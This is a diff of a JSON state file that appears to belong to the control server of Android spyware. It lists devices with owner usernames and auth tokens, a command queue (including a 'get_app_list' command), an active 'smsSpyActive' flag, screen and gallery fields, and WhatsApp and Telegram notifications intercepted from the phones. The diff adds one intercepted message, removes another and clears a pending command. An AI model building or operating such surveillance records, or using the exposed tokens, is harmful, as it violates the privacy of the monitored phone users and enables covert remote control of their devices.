@@ -9586,7 +9586,7 @@
     "deviceName": "HP-XIINZ-E979",
     "ownerUsername": "abiv12",
     "token": "42f963bfe947d35a7c960fecc604b095",
-    "lastSeen": 1776771255704,
+    "lastSeen": 1776771259269,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T09:50:02.203Z",
@@ -9627,7 +9627,7 @@
     "deviceName": "HP-SISKA_TAMA-3F6F",
     "ownerUsername": "Ubill_raa",
     "token": "e308898150127caeca3b2487066a87c8",
-    "lastSeen": 1776771255709,
+    "lastSeen": 1776771259330,
     "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T10:19:21.483Z",
@@ -9643,6 +9643,14 @@
     "lastScreenFrame": null,
     "smsSpyActive": true,
     "smsMessages": [
+      {
+        "appName": "WhatsApp",
+        "sender": "WhatsApp",
+        "content": "Mengirim video ke Status saya",
+        "time": "21/04 18:34",
+        "pkg": "com.whatsapp",
+        "receivedAt": 1776771261445
+      },
       {
         "appName": "WhatsApp",
         "sender": "WhatsApp",
@@ -13634,14 +13642,6 @@
         "time": "21/04 17:59",
         "pkg": "org.telegram.messenger",
         "receivedAt": 1776769174785
-      },
-      {
-        "appName": "Telegram",
-        "sender": "Telegram",
-        "content": "Pesan baru",
-        "time": "21/04 17:59",
-        "pkg": "org.telegram.messenger",
-        "receivedAt": 1776769174765
       }
     ],
     "galleryPhotos": [],
@@ -15928,14 +15928,8 @@
     "deviceName": "HP-VIP-DFF9",
     "ownerUsername": "kinzz",
     "token": "5d86b5519e1603f3456060c28a22c345",
-    "lastSeen": 1776771255717,
-    "commandQueue": [
-      {
-        "type": "get_app_list",
-        "payload": {},
-        "sentAt": 1776771255712
-      }
-    ],
+    "lastSeen": 1776771259292,
+    "commandQueue": [],
     "online": true,
     "connectedAt": "2026-04-21T11:31:24.904Z",
     "deviceInfo": {
